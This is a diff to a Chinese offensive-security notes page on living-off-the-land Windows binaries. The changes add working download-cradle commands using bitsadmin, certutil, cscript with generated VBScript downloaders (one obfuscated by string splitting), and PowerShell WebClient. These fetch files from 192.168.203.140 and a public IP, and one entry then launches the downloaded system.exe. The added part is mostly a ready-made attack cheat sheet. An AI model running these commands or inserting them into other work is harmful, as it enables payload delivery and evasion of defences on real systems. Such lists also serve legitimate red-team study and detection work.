@@ -21,49 +21,55 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 常见程序
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - bitsadmin.exe
+	+ 下载文件:``bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\\phpstudy_pro\\WWW\\b.ps1"``
 - cdb.exe
 - certutil.exe
-    - 可安装、备份、删除、管理和执行证书
-    - 证书存储相关功能
+    + 下载文件:``certutil -urlcache -split -f http://192.168.203.140/b.exe``
 - cmd.exe
 - cmstp.exe
 - csc.exe
 - cscript.exe
-    - 执行脚本
+	+ 第一种
+	
+	::
+	
+		echo Set Post = CreateObject("Msxml2.XMLHTTP") >>download.vbs
+		echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
+		echo Post.Open "GET","http://192.168.203.140/a.ps1",0 >>download.vbs
+		echo Post.Send() >>download.vbs
+		echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
+		echo aGet.Mode = 3 >>download.vbs
+		echo aGet.Type = 1 >>download.vbs
+		echo aGet.Open() >>download.vbs
+		echo aGet.Write(Post.responseBody) >>download.vbs
+		echo aGet.SaveToFile "D:/a.ps1",2 >>download.vbs
+	
+	+ 第二种：``echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  >> downfile.vbs``
+	+ 下载文件：``cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1``
+	
 - expand.exe
-    - 展开一个或多个压缩文件
+    + 展开一个或多个压缩文件
 - mofcomp.exe
 - msbuild.exe
-    - 构建应用程序
+    + 构建应用程序
 - mshta.exe
-    - HTML应用
 - netsh.exe
 - installutil.exe
-    - 安装/卸载程序组件
+    + 安装/卸载程序组件
 - powershell.exe
-	- 下载文件
-		``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe',``
-		``'d:\yayou\Web\RYFront\system.exe')``
-	- 执行程序
-		``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
+	+ 下载文件:``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe','d:\yayou\Web\RYFront\system.exe')``
+	+ 下载文件:``powershell (new-object Net.WebClient).DownloadFile('http://192.168.203.140/a.ps1','E:\phpstudy_pro\WWW\a.ps1')``
+	+ 执行程序:``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
 - psexec.exe
 - reg.exe
-    - 注册表控制台
 - regedit.exe
-    - 注册表修改
 - regsvr32.exe
-    - 注册动态链接库/ActiveX控件
 - rundll32.exe
-    - 执行DLL文件中的内部函数
 - sc.exe
-    - 查看服务状态管理
 - schtasks.exe
-    - 定时计划任务
 - wmic.exe
-    - Windows管理工具
 - windbg.exe
 - wscript.exe
-    - 脚本引擎
 
 后门
 ----------------------------------------
